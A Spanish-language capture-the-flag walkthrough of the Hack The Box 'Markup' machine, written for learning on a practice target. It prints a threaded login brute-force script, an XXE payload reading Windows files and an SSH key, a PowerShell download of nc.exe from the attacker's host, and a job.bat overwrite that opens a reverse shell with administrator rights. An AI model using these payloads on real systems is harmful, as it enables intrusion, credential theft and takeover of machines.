---
description: Starting Point HTB
---

# Markup

## Enumeración

```
#Enumeración de puertos abiertos
nmap -p- --open -n -min-rate 5000 10.129.133.133

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 11:53 CET
Nmap scan report for 10.129.133.133
Host is up (0.058s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

#Servicios y versiones que corren en dichos puertos
nmap -sC -sV -p22,80,443 -n -Pn 10.129.133.133

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 11:54 CET
Nmap scan report for 10.129.133.133
Host is up (0.060s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

```

## Web

Nada más acceder tenemos un formulario de login, así que tras probar algunas cosas pensé en atacar por fuera bruta directamente el formulario con un script que hice en los [laboratorios de Portswigger](../portswigger/authentication-labs.md). Aunque la verdad podría habérmelo ahorrado por el usuario y contraseña que me salieron.

```
#!/usr/bin/python3

import argparse
import requests
from pwn import *
from bs4 import BeautifulSoup
from threading import Thread
from queue import Queue

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Worker(Thread):
    """ Thread executing tasks from a given tasks queue """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                # An exception happened in this thread
                print(e)
            finally:
                # Mark this task as done, whether an exception happened or not
                self.tasks.task_done()

class ThreadPool:
    """ Pool of threads consuming tasks from a queue """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """ Add a task to the queue """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """ Add a list of tasks to the queue """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """ Wait for completion of all the tasks in the queue """
        self.tasks.join()

def lista(archivo):
        f = open("%s" % archivo, encoding="ISO-8859-1")
        temp = f.read().splitlines()
        f.close()
        return temp


def comprobar(usuario, passw, valor):
    p1.status("%s" % usuario)
    p2.status("%s" % passw)
    data_post = {
        'username': usuario,
        'password': passw
    }
    content = requests.post(url, data=data_post)
    if "Wrong Credentials" in content.text:
        xyd="0"
    else:
        log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))

def usuarios_bf ():
	lista_usuarios = lista("usuarios")
	pool = ThreadPool(20)
	for i in lista_usuarios:
		pool.add_task(comprobar, i, "asd", "Invalid username")
	pool.wait_completion()

def pass_bf ():
	lista_pass = lista("/usr/share/wordlists/rockyou.txt")
	pool = ThreadPool(20)
	for i in lista_pass:
		pool.add_task(comprobar, usuario_correcto, i, "Wrong Credentials")
	pool.wait_completion()

#Marcamos los argumentos
parser = argparse.ArgumentParser(description='Programa para hacer BruteForce en PortSwigger.', add_help=False)
parser.add_argument("-h", "--help", action='help', default=argparse.SUPPRESS, help='Muestra la ayuda')
grupo = parser.add_mutually_exclusive_group()
grupo.add_argument("-u", "--usuarios", help="Realiza Brute Force sobre Usuarios", action="store_true")
grupo.add_argument("-p", "--passwords", help="Realiza Brute Force sobre contraseñas", action="store_true")
parser.add_argument("-U", "--url", help="Introduce la URL", required=True)
parser.add_argument("-c", "--correctuser", help="Introduce un usuario correcto para sacar la contraseña")
args = parser.parse_args()

url = args.url
p1 = log.progress("Usuarios")
p2 = log.progress("Contraseñas")
if args.usuarios:
	usuarios_bf()
elif args.passwords:
	if args.correctuser is None:
		parser.error('Se requiere un usuario correcto')
	else:
		usuario_correcto = args.correctuser
		pass_bf()
else:
	print('Utiliza -h o --help para ver el mensaje de Ayuda')

```

* Usuario:admin
* Contraseña:password

Una vez dentro nos ponemos a buscar por la web y vemos que tenemos el siguiente formulario, siempre que haya una entrada de datos hay una posible vulnerabilidad así que vamos a ver cómo funciona.

![Formulario de entrada de datos](<../.gitbook/assets/image (29).png>)



![Envío por XML](<../.gitbook/assets/image (24).png>)

Aquí podemos empezar a pensar en un XEE (XML External Entity), por lo que vamos a cambiar la entrada:

![Inyección](<../.gitbook/assets/image (36).png>)

```
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY inyeccion SYSTEM 'file:////c:/windows/win.ini'>]>
<order><quantity></quantity><item>&inyeccion;</item><address>asd</address></order>
```

Sabemos que tenemos acceso a los archivos del sistema, esto puede ser interesante, pero necesitamos más información para poder aprovecharlo así que seguimos echando un ojo por la web hasta ver lo siguiente.

![HTML de la página services.php](<../.gitbook/assets/image (37).png>)

¿Qué será Daniel?¿Un usuario?¿Estará en el sistema?

A menos de que encontremos otra forma para entrar a través de la web pensemos en los servicios que sabemos que están activos, entre ellos tenemos un ssh, podríamos probar a ver si existe un id\_rsa dentro de la carpeta de un posible usuario daniel.

![id\_rsa del usuario daniel](<../.gitbook/assets/image (35).png>)

Perfecto, probablemente con esto ya podemos acceder al sistema cómo el usuario daniel, para ello copiamos la id\_rsa y hacemos un archivo en nuestro sistema para acceder por ssh.

## Escalar privilegios

```
ssh -i id_rsa daniel@10.129.133.133

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

Ya podemos acceder a la primera flag, pero también necesitamos acceder a la de root.

Enumerando el sistema poco a poco, nos encontramos con una carpeta llamada Log-Management que tiene un .bat que parece interesante.

```
daniel@MARKUP C:\Users\daniel\Desktop>cd C:\

daniel@MARKUP C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\

03/12/2020  02:56 AM    <DIR>          Log-Management
09/14/2018  11:12 PM    <DIR>          PerfLogs
07/28/2021  01:01 AM    <DIR>          Program Files
09/14/2018  11:21 PM    <DIR>          Program Files (x86)
07/28/2021  02:38 AM                 0 Recovery.txt
03/05/2020  04:40 AM    <DIR>          Users
07/28/2021  01:16 AM    <DIR>          Windows
03/05/2020  09:15 AM    <DIR>          xampp
               1 File(s)              0 bytes
               7 Dir(s)   7,380,488,192 bytes free

daniel@MARKUP C:\>cd Log-Management

daniel@MARKUP C:\Log-Management>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\Log-Management

03/12/2020  02:56 AM    <DIR>          .
03/12/2020  02:56 AM    <DIR>          ..
03/06/2020  01:42 AM               346 job.bat
               1 File(s)            346 bytes
               2 Dir(s)   7,377,014,784 bytes free

daniel@MARKUP C:\Log-Management>job.bat 
You must run this script as an Administrator! 
Connection to 10.129.147.127 closed.

@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G") 
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

Parece ser que sólo puede ser ejecutado por el Administrador, ¿Tenemos algún permiso para interactuar con el archivo?

```
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Parece que podemos escribir, así que se me ocurre que podemos intentar hacer que en el momento que se ejecute por el administrador nos proporcione una reverse shell, probemos.

Para hacerlo primero vamos a traernos un binario de nc a la máquina objetivo.

En parrot y en Linux en principio existe un binario de nc que podemos utilizar para este fin por lo que vamos a abrir un servidor para enviar el archivo.

```
locate nc.exe
    /usr/share/sqlninja/apps/nc.exe
cd /usr/share/sqlninja/apps/
python3 -m http.server
```

Y por otro lado en la máquina objetivo.

```
powershell
(New-Object Net.Webclient).DownloadFile("http://10.10.16.32:8000/nc.exe","nc.exe")
```

Una vez con nuestro nc en la máquina objetivo vamos a modificar el "job.bat" y hacer que nos envíe una reverse Shell, para ello primero en nuestra máquina:

```
sudo rlwrap nc -nlvp 1234
```

Y en la máquina objetivo:

```
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.32 1234 > C:\Log-Management\job.bat 
```

Y ya veremos cómo efectivamente hemos conseguido ser root:

```
listening on [any] 1234 ...
connect to [10.10.16.32] from (UNKNOWN) [10.129.147.127] 49694
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
markup\administrator

C:\Windows\system32>
```

¡Y ya en el escritorio del Administrador encontraremos la flag!
